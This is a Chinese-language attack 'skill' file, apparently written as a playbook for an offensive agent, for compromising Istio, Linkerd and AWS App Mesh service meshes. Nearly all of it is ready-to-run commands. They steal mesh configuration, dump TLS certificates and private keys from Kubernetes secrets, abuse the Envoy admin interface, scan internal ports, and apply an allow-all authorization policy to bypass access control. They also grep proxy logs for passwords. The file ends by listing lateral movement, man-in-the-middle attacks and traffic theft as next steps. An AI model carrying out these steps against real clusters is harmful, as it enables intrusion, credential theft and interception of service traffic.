---
name: servicemesh-attack
type: attack
category: service-mesh
platform: multiple
severity: high
---

# Service Mesh 攻击技能

## 触发条件

- 有 Kubernetes 或云平台凭证
- 目标使用 Service Mesh（Istio、Linkerd、AWS App Mesh）
- 用户要求"攻击 Service Mesh"

## 前置检查

```bash
# 1. 检查 Istio
kubectl get namespace istio-system
kubectl get pods -n istio-system

# 2. 检查 Linkerd
kubectl get namespace linkerd
kubectl get pods -n linkerd

# 3. 检查 App Mesh
aws appmesh list-meshes
```

## 攻击方法

### 方法 1: Istio 配置窃取

```bash
# 1. 获取所有 VirtualService
kubectl get virtualservices --all-namespaces

# 2. 获取 VirtualService 详情
kubectl get virtualservice SERVICE_NAME -n NAMESPACE -o yaml

# 3. 获取所有 DestinationRule
kubectl get destinationrules --all-namespaces

# 4. 搜索敏感配置
kubectl get virtualservices --all-namespaces -o yaml | grep -i "host|route"
kubectl get destinationrules --all-namespaces -o yaml | grep -i "host|subset"
```

### 方法 2: Istio Gateway 攻击

```bash
# 1. 获取所有 Gateway
kubectl get gateways --all-namespaces

# 2. 获取 Gateway 详情
kubectl get gateway GATEWAY_NAME -n NAMESPACE -o yaml

# 3. 查看服务器配置
kubectl get gateway ... -o yaml | grep -A 10 "servers:"

# 4. 查找 TLS 证书
kubectl get secret -n istio-system | grep -i "cert|tls"
kubectl get secret CERT_SECRET -n istio-system -o yaml
```

### 方法 3: Istio Sidecar 注入利用

```bash
# 1. 检查 Sidecar 注入
kubectl get namespace NAMESPACE -o yaml | grep -A 5 "istio-injection"

# 2. 列出所有 Pod 的 Sidecar
kubectl get pods -n NAMESPACE -o json | jq -r '.items[] | select(.spec.containers[].name | contains("istio-proxy"))'

# 3. 获取 Sidecar 配置
kubectl exec POD_NAME -n NAMESPACE -c istio-proxy -- cat /etc/istio/proxy/config.yaml

# 4. 通过 Sidecar 执行命令
kubectl exec POD_NAME -n NAMESPACE -c istio-proxy -- /bin/sh -c "curl http://localhost:15000/clusters"
```

### 方法 4: Envoy Admin 接口利用

```bash
# 1. 端口转发 Envoy Admin
kubectl port-forward POD_NAME -n NAMESPACE 15000:15000

# 2. 访问 Envoy Admin
curl http://localhost:15000/help

# 3. 获取所有 Cluster
curl http://localhost:15000/clusters

# 4. 获取所有 Listener
curl http://localhost:15000/listeners

# 5. 获取路由配置
curl http://localhost:15000/config_dump
```

### 方法 5: Service 到 Service 通信利用

```bash
# 1. 通过 Sidecar 访问其他服务
kubectl exec POD_NAME -n NAMESPACE -c istio-proxy \
  -- curl http://service-name.namespace.svc.cluster.local/endpoint

# 2. 列出所有可访问的服务
curl http://localhost:15000/clusters | grep -i "name::"

# 3. 内部端口扫描
for port in 80 443 8080 8443; do
  kubectl exec POD_NAME -n NAMESPACE -c istio-proxy \
    -- curl -v http://target-service:$port
done
```

### 方法 6: Linkerd 攻击

```bash
# 1. 获取 Linkerd 配置
kubectl get configmap -n linkerd

# 2. 获取所有 ServiceProfile
kubectl get serviceprofiles --all-namespaces

# 3. 通过 Linkerd Proxy 执行命令
kubectl exec POD_NAME -n NAMESPACE -c linkerd-proxy \
  -- /usr/lib/linkerd/linkerd2-proxy admin

# 4. 获取路由配置
kubectl exec POD_NAME -n NAMESPACE -c linkerd-proxy \
  -- curl -s http://localhost:4191/reset
```

### 方法 7: AWS App Mesh 攻击

```bash
# 1. 列出所有 Mesh
aws appmesh list-meshes

# 2. 获取 Mesh 详情
aws appmesh describe-mesh --mesh-name MESH_NAME

# 3. 列出所有 VirtualNode
aws appmesh list-virtual-nodes --mesh-name MESH_NAME

# 4. 获取 VirtualNode 配置
aws appmesh describe-virtual-node \
  --mesh-name MESH_NAME \
  --virtual-node-name NODE_NAME

# 5. 搜索后端服务
aws appmesh describe-virtual-node ... | jq -r '.spec.backends'
```

### 方法 8: TLS 证书利用

```bash
# 1. 获取所有 TLS Secret
kubectl get secrets --all-namespaces | grep -i "istio|linkerd|mesh"

# 2. 提取证书
kubectl get secret CERT_SECRET -n NAMESPACE -o yaml

# 3. 解码证书
kubectl get secret CERT_SECRET -n NAMESPACE -o json | \
  jq -r '.data."tls.crt"' | base64 -d > /tmp/cert.pem

# 4. 解码私钥
kubectl get secret CERT_SECRET -n NAMESPACE -o json | \
  jq -r '.data."tls.key"' | base64 -d > /tmp/key.pem

# 5. 分析证书
openssl x509 -in /tmp/cert.pem -text -noout
```

### 方法 9: Service Policy 绕过

```bash
# 1. 获取所有 AuthorizationPolicy
kubectl get authorizationpolicies --all-namespaces

# 2. 获取 Policy 详情
kubectl get authorizationpolicy POLICY_NAME -n NAMESPACE -o yaml

# 3. 查找宽松的 Policy
kubectl get authorizationpolicies --all-namespaces -o yaml | \
  grep -A 5 "ALLOW"

# 4. 创建允许所有流量的 Policy
cat > allow-all.yaml <<'EOF'
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-all
  namespace: NAMESPACE
spec:
  {}
EOF
kubectl apply -f allow-all.yaml
```

### 方法 10: Telemetry 和日志利用

```bash
# 1. 获取 Telemetry 配置
kubectl get telemetry --all-namespaces

# 2. 获取日志配置
kubectl get telemetry CONFIG_NAME -n NAMESPACE -o yaml

# 3. 如果日志发送到外部系统
# 可能泄露敏感信息

# 4. 查看访问日志
kubectl logs -n istio-system deployment/istio-ingressgateway

# 5. 通过日志获取请求信息
kubectl logs -n NAMESPACE POD_NAME -c istio-proxy | grep -i "password|secret"
```

## 验证成功

```bash
# 成功获取 VirtualService
kubectl get virtualservices --all-namespaces

# 成功获取 Gateway
kubectl get gateways --all-namespaces

# 成功访问 Envoy Admin
kubectl port-forward POD_NAME -n NAMESPACE 15000:15000
curl http://localhost:15000/clusters
```

## 下一步

1. 通过 Service Mesh 横向移动
2. 利用 TLS 证书建立中间人攻击
3. 窃取服务间通信数据
4. 通过 Policy 绕过访问控制
